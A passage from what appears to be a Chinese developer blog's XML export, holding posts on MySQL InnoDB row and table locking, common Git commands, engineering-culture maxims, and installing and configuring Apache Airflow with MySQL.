update goods set stock = stock - 1 where id = 1 and stock = cur_stock;</span><br><span class="line">commit;</span><br></pre></td></tr></tbody></table></figure></li><li><h4 id="行锁和表锁"><a href="#行锁和表锁" class="headerlink" title="行锁和表锁"></a>行锁和表锁</h4></li></ul><blockquote><ol><li>只根据主键进行查询，并且查询到数据，主键字段产生行锁。</li><li>除了使用非主键不含索引字段查询，其余所有的查询，没有查询到数据，就不产生锁。</li><li>根据主键、非主键含索引（name）进行查询，并且查询到数据，主键字段产生行锁，name字段产生行锁。<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin;</span><br><span class="line">select * from goods where id = 1 and name='prod11' for update;</span><br><span class="line">commit;</span><br></pre></td></tr></tbody></table></figure></li><li>根据主键、非主键不含索引（name）进行查询，并且查询到数据，如果其他线程按主键字段进行再次查询，则主键字段产生行锁，如果其他线程按非主键不含索引字段进行查询，则非主键不含索引字段产生表锁，如果其他线程按非主键含索引字段进行查询，则非主键含索引字段产生行锁，如果索引值是枚举类型，mysql也会进行表锁。</li><li>根据非主键含索引（name）进行查询，并且查询到数据，name字段产生行锁。</li><li>根据非主键不含索引（name）进行查询，查到或查不到数据，name字段产生表锁。</li><li>只根据主键进行查询，查询条件为不等于，查到或查不到数据，主键字段产生都表锁。</li><li>只根据主键进行查询，查询条件为 like，查到或查不到数据，主键字段产生表锁。</li></ol></blockquote><ul><li><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4></li></ul><blockquote><ol><li>InnoDB行锁是通过给索引上的索引项加锁来实现的，只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁。==行锁一定有索引==</li><li>当表有多个索引的时候，不同的事务可以使用不同的索引锁定不同的行，另外，不论是使用主键索引、唯一索引或普通索引，InnoDB都会使用行锁来对数据加锁。 </li><li>如果MySQL认为全表扫描效率更高，比如对一些很小的表，它就不会使用索引，这种情况下InnoDB将使用表锁，而不是行锁。</li><li>检索值的==数据类型==与索引字段不同，虽然MySQL能够进行数据类型转换，但却不会使用索引，从而导致InnoDB使用表锁。</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-常用命令整理</title>
      <link href="/uncatesgorized/2021-03-07-Git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="远程分支强制覆盖本地分支-超级常用"><a href="#远程分支强制覆盖本地分支-超级常用" class="headerlink" title="远程分支强制覆盖本地分支(超级常用)"></a>远程分支强制覆盖本地分支(超级常用)</h4><p>置顶是因为我自己用了无数遍呀！！</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin/your branch name</span><br><span class="line">git pull</span><br></pre></td></tr></tbody></table></figure><h4 id="快捷提交"><a href="#快捷提交" class="headerlink" title="快捷提交"></a>快捷提交</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -a -m 'this is my commit'</span><br></pre></td></tr></tbody></table></figure><p>等价于</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m 'your commit'</span><br></pre></td></tr></tbody></table></figure><h4 id="命令简写-mac环境，windows没试"><a href="#命令简写-mac环境，windows没试" class="headerlink" title="命令简写(mac环境，windows没试)"></a>命令简写(mac环境，windows没试)</h4><p>命令行输入：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias</span><br></pre></td></tr></tbody></table></figure><p>会列出所有git相关的缩写，当然也可以自己配。<br><img src="https://img-blog.csdnimg.cn/20190526223820765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="alias"><br>常用的也就几个：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">切换指定分支：</span><br><span class="line">gco branch_name</span><br><span class="line">切换到master分支：</span><br><span class="line">gcm</span><br><span class="line">查看分支：</span><br><span class="line">gb</span><br><span class="line">查看修改：</span><br><span class="line">gd</span><br><span class="line">拉代码：</span><br><span class="line">gl</span><br></pre></td></tr></tbody></table></figure><h4 id="新建没有parent的新分支"><a href="#新建没有parent的新分支" class="headerlink" title="新建没有parent的新分支"></a>新建没有parent的新分支</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan branch-name</span><br></pre></td></tr></tbody></table></figure><h4 id="Git-代码量"><a href="#Git-代码量" class="headerlink" title="Git 代码量"></a>Git 代码量</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --format='%aN' | sort -u | while read name; do echo -en "$name\t"; git log --author="$name" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf "added lines: %s, removed lines: %s, total lines: %s\n", add, subs, loc }' -; done</span><br></pre></td></tr></tbody></table></figure><h4 id="Git-命令提示：perl-warning-Setting-locale-failed"><a href="#Git-命令提示：perl-warning-Setting-locale-failed" class="headerlink" title="Git 命令提示：perl: warning: Setting locale failed."></a>Git 命令提示：perl: warning: Setting locale failed.</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim  ~/.zshrc</span><br><span class="line"></span><br><span class="line"># Setting for the new UTF-8 terminal support in Lion</span><br><span class="line">LC_CTYPE=en_US.UTF-8</span><br><span class="line">LC_ALL=en_US.UTF-8</span><br><span class="line"></span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">重启iTerm</span><br></pre></td></tr></tbody></table></figure><h4 id="merge某个或几个commit"><a href="#merge某个或几个commit" class="headerlink" title="merge某个或几个commit"></a>merge某个或几个commit</h4><p>有些特殊情况不能直接merge(一个分支上同时有你和别人的commit)，但是你的commit需要上线了。</p><ul><li>查找要merge的commitId<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gco old_branch</span><br><span class="line">git log</span><br></pre></td></tr></tbody></table></figure><blockquote><p>commit 1534c530522982a6ff050ac420b300ae4364474e<br>Author: lidoudou &lt;<a href="mailto:lidoudou@csdn.com">lidoudou@csdn.com</a>&gt;<br>Date:   Sat Apr 27 17:15:14 2019 +0800<br> update kafka setting</p></blockquote></li><li>切换到目标分支，pick目标commit<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gco new_branch</span><br><span class="line">git cherr-pick 1534c530522  // commitId</span><br></pre></td></tr></tbody></table></figure></li><li>正常的话现在可以看到new_branch上有了commitId不同，但是标识名相同的记录。</li><li>当然也会出现意外——代码冲突了，按一般的冲突一样fix就OK了。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优秀工程师文化</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/About-%E4%BC%98%E7%A7%80%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/About-%E4%BC%98%E7%A7%80%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="自我认识"><a href="#自我认识" class="headerlink" title="自我认识"></a>自我认识</h4><ul><li><code>有深刻的认知和认同</code></li><li><strong>暂时没有做到或没有切身体会</strong></li></ul><h4 id="优秀的工程师文化最基本三要素"><a href="#优秀的工程师文化最基本三要素" class="headerlink" title="优秀的工程师文化最基本三要素"></a>优秀的工程师文化最基本三要素</h4><ul><li>尊重</li><li>信任</li><li>责任</li></ul><h4 id="工程师文化"><a href="#工程师文化" class="headerlink" title="工程师文化"></a>工程师文化</h4><ol><li><code>团队才是王道</code></li><li><code>快速失败，学习，迭代</code></li><li><code>为学习预留时间</code>，<code>保持学习耐心</code></li><li><code>必须坦诚，隐瞒是有害的</code></li><li><code>学会批评和接受批评</code></li><li>所谓强壮的文化，是能接受有益的改变，抵御有害的变化</li><li><code>建设团队文化并不是负责人的事，团队所有成员都有份</code></li><li><code>团队文化从招聘开始，技术再牛，如果步调跟团队不一致，往往会成为一个很大的不确定因素</code></li><li>想要优秀的工程师为自己工作，首要的是雇佣出色的工程师</li><li>每个人都对产品的成功抱有强烈的主人翁精神和责任感，初创团队成员更应有这种意识建设性批评是工程团队的成长基石</li><li>诤友难得</li><li><code>同步沟通的时候人越少越好（开会，群讨论）</code>，异步沟通的时候听众越多越好（邮件）能够参加会议跟身份地位等同起来的做法是极其愚蠢的</li><li>时间尚早但议题已经讨论完毕，立刻散会</li><li><code>不做设计，直接写代码的行为是不可取的</code></li><li>任何warning都可能要了你的命</li><li>每个提交都必须经过代码审查</li><li><code>真正的测试和发布流程</code></li><li>负责人要做李云龙式的冲锋队长不要学诸葛亮运筹帷幄</li><li>理解每一位员工的困难，萝卜加大棒式的管理方式不适合现在企业</li><li><code>做一个禅师，保持淡定和冷静</code></li><li><code>学会提问式沟通，</code>不要随便给人打标签<code>，任何人都会成长</code></li><li>培养敢于冒险精神的氛围</li><li><code>称赞同事可以，但是每个人都称赞那叫“互吹”</code></li><li>团队想要在一个方向上快速前进就要让所有人同心协力，步调必须一致</li><li>多关心下同伴在工作之外的情况是很有必要的</li><li>对同伴需要更多的激励和方向指引</li><li><code>独立工作不需要别人看着才能工作</code></li><li><code>学习新技能，在现有基础上继续磨练得到提高是一个工程师职业生涯的续命丹药</code></li><li><code>需要给自己目标，长期目标，短期目标</code></li><li>快速走出负面情绪</li><li>不是要把“烂人”轰走，而是要培养一种拒绝负面行为的文化氛围</li><li><code>尊重别人的时间</code></li><li>不要过分的索取</li><li><strong>转移完美主义者的注意力</strong></li><li>知道什么时候放弃</li><li><code>在完成自己工作的前提下，要求更多的责任</code></li><li>敢于冒险，不怕失败</li><li><code>对不确定的事情提出疑问</code></li><li><code>在leader问你进展之前，主动汇报</code>。遇到的困难、完成任务、需要帮助，或者不希望什么事情发生</li><li>不尊重工程师的公司，只把他们当实现商业目的工具的公司，工程师不会对这家公司有任何感情</li><li>过度的向上管理不可取</li><li>要分清什么是进取型工作什么是防御性工作</li><li><code>要有自己的偶像</code>，并向偶像模仿，提高</li><li>如果不努力去学习、了解引导公司的方法，那就等于拿自己的命运去赌博</li><li>大而全的系统往往是完美主义者的臆想</li><li>最好不要纸上谈兵，架构不是设计出来的，是优化出来的</li><li><code>懒惰是千万要小心的陷阱</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件-Airflow进阶</title>
      <link href="/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E8%BF%9B%E9%98%B6/"/>
      <url>/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><hr><p><strong>用户界面也有以下相关操作按钮</strong></p><ul><li><p>查看</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、列出现有所有的活动的DAGS</span><br><span class="line">airflow list_dags</span><br><span class="line"></span><br><span class="line">2、列出 tutorial 的任务id</span><br><span class="line">airflow list_tasks tutorial</span><br><span class="line"></span><br><span class="line">3、以树形图的形式列出 tutorial 的任务id</span><br><span class="line">airflow list_tasks tutorial --tree</span><br></pre></td></tr></tbody></table></figure></li><li><p>测试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、模拟2015-06-01 执行tutorial的print_date任务</span><br><span class="line">airflow test tutorial print_date 2015-06-01</span><br></pre></td></tr></tbody></table></figure></li><li><p>回填数据</p><blockquote><p>如果希望新写的DAG执行过去一段时间的任务怎么办？<br>backfill 可以执行一个时间段内应该执行的所有任务</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airflow backfill tutorial -s 2018-06-01 -e 2015-08-01</span><br></pre></td></tr></tbody></table></figure></li><li><p>重建元数据库</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airflow resetdb [-h] [-y]</span><br><span class="line"></span><br><span class="line">-y --yes，不经过提示确认就重置，默认为False</span><br></pre></td></tr></tbody></table></figure></li></ul><h5 id="更多命令-官方Command-Line-Interface"><a href="#更多命令-官方Command-Line-Interface" class="headerlink" title="更多命令  官方Command Line Interface"></a>更多命令  <a href="http://airflow.incubator.apache.org/cli.html">官方Command Line Interface</a></h5><hr><h2 id="BaseOperator"><a href="#BaseOperator" class="headerlink" title="BaseOperator"></a>BaseOperator</h2><p>官网例子，里面的各个属性有代表什么意思？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">"""</span><br><span class="line">Code that goes along with the Airflow tutorial located at:</span><br><span class="line">https://github.com/apache/incubator-airflow/blob/master/airflow/example_dags/tutorial.py</span><br><span class="line">"""</span><br><span class="line">from airflow import DAG</span><br><span class="line">from airflow.operators.bash_operator import BashOperator</span><br><span class="line">from datetime import datetime, timedelta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">default_args = {</span><br><span class="line">    'owner': 'airflow',</span><br><span class="line">    'depends_on_past': False,</span><br><span class="line">    'start_date': datetime(2015, 6, 1),</span><br><span class="line">    'email': ['airflow@example.com'],</span><br><span class="line">    'email_on_failure': False,</span><br><span class="line">    'email_on_retry': False,</span><br><span class="line">    'retries': 1,</span><br><span class="line">    'retry_delay': timedelta(minutes=5),</span><br><span class="line">    # 'queue': 'bash_queue',</span><br><span class="line">    # 'pool': 'backfill',</span><br><span class="line">    # 'priority_weight': 10,</span><br><span class="line">    # 'end_date': datetime(2016, 1, 1),</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">dag = DAG('tutorial', default_args=default_args)</span><br><span class="line"></span><br><span class="line"># t1, t2 and t3 are examples of tasks created by instantiating operators</span><br><span class="line">t1 = BashOperator(</span><br><span class="line">    task_id='print_date',</span><br><span class="line">    bash_command='date',</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t2 = BashOperator(</span><br><span class="line">    task_id='sleep',</span><br><span class="line">    bash_command='sleep 5',</span><br><span class="line">    retries=3,</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">templated_command = """</span><br><span class="line">    {% for i in range(5) %}</span><br><span class="line">        echo "{{ ds }}"</span><br><span class="line">        echo "{{ macros.ds_add(ds, 7)}}"</span><br><span class="line">        echo "{{ params.my_param }}"</span><br><span class="line">    {% endfor %}</span><br><span class="line">"""</span><br><span class="line"></span><br><span class="line">t3 = BashOperator(</span><br><span class="line">    task_id='templated',</span><br><span class="line">    bash_command=templated_command,</span><br><span class="line">    params={'my_param': 'Parameter I passed in'},</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t2.set_upstream(t1)</span><br><span class="line">t3.set_upstream(t1)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><ol><li><strong>retries</strong> (int) 重试几次才标记为失败</li><li><strong>retry_delay</strong> (timedelta) 两次重试间隔多长时间</li><li><strong>retry_exponential_backoff</strong>（bool）在重试延迟上运用算法增加等待时间</li><li><strong>max_retry_delay</strong> (timedelta)  重试之间的最大时间间隔</li><li><strong>start_time</strong> （datatime）确定第一个任务实例的execution_date，最佳做法是将start_date四舍五入到DAG的schedule_interval。</li><li><strong>end_time</strong> （datetime）如果指定，调度程序将不会超出此日期。</li><li><strong>depends_on_past</strong> （bool）设置为true时，任务实例将依次运行，同时依赖上一个任务的计划成功。允许start_date的任务实例运行。</li><li><strong>wait_for_downstream</strong> （bool）TODO</li><li><strong>dag</strong> (DAG) 任务所附的dag的引用（如果有的话）</li><li>parallelism：这个参数指定了整个Airflow系统，在任何一刻能同时运行的Task Instance的数量，这个数量跟DAG无关，只跟Executor和Task有关。举个例子：如果parallelism=15, 这时你有两个DAG，A和B，如果A需要同时开跑10个Task，B也要同时开跑10个Task，两个DAG同时触发，那么这时候同时在跑的Task数量只能是15，其余的5个会等之前的Task运行完了触发，这时的状态不会显示在web上。而且在这种情况下，触发的顺序是不确定的。</li></ol></blockquote><blockquote><ol start="11"><li>dag_concurrency：这个参数指定了同一个Dag Run中能同时运行的Task Instance的个数</li></ol></blockquote><blockquote><ol start="12"><li>max_active_runs_per_dag：这个参数指定了同一个Dag能被同时激活的Dag Run的数量</li></ol></blockquote><blockquote><ol start="13"><li>non_pooled_task_slot_count：这个参数指定了默认的Pool能同时运行的Task Instance的数量，如果你的Task没有指定Pool选项，那么这个Task就是属于这个默认的Pool的</li><li><a href="https://www.cnblogs.com/skyrim/p/7456166.html">更多配置</a></li></ol></blockquote><h2 id="airflow执行组件"><a href="#airflow执行组件" class="headerlink" title="airflow执行组件"></a>airflow执行组件</h2><ul><li>Scheduler：这个是整个Airflow的调度器，Airflow所有DAG的调度过程是由Scheduler轮询来处理的。触发条件达到后，会丢给Executor执行。</li><li>Executor：现在的Executor有三种：</li></ul><blockquote><ul><li>SequnceExecutor：提供本地执行，并且串行执行一个DAG中的所有Task，基本上只用在初期的Airflow概念验证阶段    </li><li>LocalExecutor：这个是比较常用的Executor，可以在本地并行执行一个DAG内的所有Task    </li><li>CeleryExecutor：这个是在大型任务调度场景，或者是表较复杂的任务分离场景中需要用到的Executor。顾名思义，在这个Executor下，Airflow使用了Celery这个强大的Python分布式队列框架去分发任务，然后在这样的环境下，需要在执行任务的机器上启用Airflow Worker来处理队列中的请求。 </li><li>在一个Airflow中同时只能一个Executor启动，不能给指定的DAG指定Executor</li></ul></blockquote><ul><li>Pool：这个Pool虽然不是Airflow的核心，但也跟整个Airflow的执行流程相关。任何一个Task其实都是指定了Pool这个参数的，即使没有自己指定，其实也是归结到了Default Pool这么个池子中。Pool本身是个抽象的概念，由Slot组成，可以建立任何一个Pool，指定Slot的数量。任何一个使用了这个Pool的Task Instance就需要占用一个Slot，Slot用完了，Task就处于等待状态。</li></ul><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ul><li>配置元素优先级<blockquote><p>环境变量<br>  airflow.cfg中的配置<br>  airflow.cfg中的命令<br>  默认</p></blockquote></li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>官方推荐 MySQL or Postgres 两种数据库</li><li>本地配置好数据库后<blockquote><p>在airflow.cfg 中配置“executor”为“LocalExecutor”，可以在本地并行化任务实例的执行程序。</p></blockquote></li></ul><h5 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h5><p><a href="http://wingerted.com/">http://wingerted.com</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Airflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件-Airflow安装与简单使用</title>
      <link href="/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ul><li><p>1、新建一个虚拟环境</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">virtualenv airflowenv</span><br><span class="line">source airflowenv/bin/activate</span><br></pre></td></tr></tbody></table></figure></li><li><p>2、安装airflow<br> 需要等一段时间</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install airflow==1.8.0</span><br></pre></td></tr></tbody></table></figure></li><li><p>3、查看安装结果</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airflow version</span><br></pre></td></tr></tbody></table></figure><blockquote><p>出现如下则说明安装成功</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">____________       _____________</span><br><span class="line">____    |__( )_________  __/__  /________      __</span><br><span class="line">____  /| |_  /__  ___/_  /_ __  /_  __ \_ | /| / /</span><br><span class="line">___  ___ |  / _  /   _  __/ _  / / /_/ /_ |/ |/ /</span><br><span class="line">_/_/  |_/_/  /_/    /_/    /_/  \____/____/|__/</span><br><span class="line">  v1.8.0</span><br></pre></td></tr></tbody></table></figure></blockquote></li><li><p>4、cd 进入airflow文件夹</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></tbody></table></figure><blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有以下两个文件</span><br><span class="line">-rw-r--r--   1 ***  staff  11602  8 28 18:06 airflow.cfg</span><br><span class="line">-rw-r--r--   1 ***  staff   1549  8 27 12:31 unittests.cfg</span><br></pre></td></tr></tbody></table></figure><p>airflow.cfg有许多<strong>配置项</strong>，后面会作简单解释</p></blockquote></li><li><p>5、初始化airflow数据库</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airflow initdb</span><br><span class="line">默认配置使用SQLLite，执行后在airflow文件夹生成一个airflow.db数据库文件（可以通过配置airflow.cfg的方式更改数据库类型如：mysql）</span><br></pre></td></tr></tbody></table></figure></li><li><p>6、启动服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airflow webserver -p 8080</span><br><span class="line">执行之后在浏览器输入：localhost:8080/admin</span><br><span class="line">结果如下所示：</span><br></pre></td></tr></tbody></table></figure><p><img src="https://img-blog.csdn.net/20180828194455231?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="airflow"></p></li></ul><h4 id="安装工作结束"><a href="#安装工作结束" class="headerlink" title="安装工作结束"></a>安装工作结束</h4><h2 id="二、更改数据库为Mysql"><a href="#二、更改数据库为Mysql" class="headerlink" title="二、更改数据库为Mysql"></a>二、更改数据库为Mysql</h2><ul><li><p>1、安装MySQL，方法不限</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mysql-python</span><br></pre></td></tr></tbody></table></figure></li><li><p>2、成功进入MySQL之后</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建用户</span><br><span class="line">CREATE USER airflow;</span><br><span class="line">新建数据库</span><br><span class="line">CREATE DATABASE airflow;</span><br><span class="line">CREATE DATABASE celery_result_airflow;</span><br><span class="line">给权限</span><br><span class="line">GRANT all privileges on airflow.* TO 'airflow'@'%' IDENTIFIED BY 'airflow';</span><br><span class="line">GRANT all privileges on celery_result_airflow.* TO 'airflow'@'%' IDENTIFIED BY 'airflow';</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>3、打开上文提到的airflow.cfg<br>将 sql_alchemy_conn，改为如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_alchemy_conn = mysql://airflow:airflow@localhost:3306/airflow</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">初始化元数据库</span><br><span class="line">airflow initdb</span><br><span class="line">重置元数据库</span><br><span class="line">airflow resetdb</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="三、启动airflow"><a href="#三、启动airflow" class="headerlink" title="三、启动airflow"></a>三、启动airflow</h2><ul><li><p>运行命令（需要在不同窗口）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airflow webserver -p 8080</span><br><span class="line">airflow scheduler</span><br><span class="line"></span><br><span class="line">以非root用户运行</span><br><span class="line">airflow worker</span><br></pre></td></tr></tbody></table></figure></li><li><p>浏览器输入 localhost:8080/admin</p></li><li><p>(o゜▽゜)o☆[BINGO!]</p></li></ul><h2 id="四、实际项目中可能遇到的问题"><a href="#四、实际项目中可能遇到的问题" class="headerlink" title="四、实际项目中可能遇到的问题"></a>四、实际项目中可能遇到的问题</h2><ul><li><p>如何打开已有项目</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在 airflow.cfg文件中将 dags_folder 指向已有项目</span><br><span class="line">原本为：dags_folder = /Users/liyuxing/airflow/dags</span><br><span class="line">改为：dags_folder = /Users/liyuxing/work/mive/dags</span><br></pre></td></tr></tbody></table></figure></li><li><p>如果需要添加自己的dags，在airflow目录下新建dags文件夹，并将文件放入文件夹即可，airflow会自己找。</p></li><li><p>报错 No module named pyutil.program.conf</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‘*’号为Python版本</span><br><span class="line">cd airflowenv/lib/python*.*/site-packages</span><br><span class="line">vim data.pth</span><br><span class="line"></span><br><span 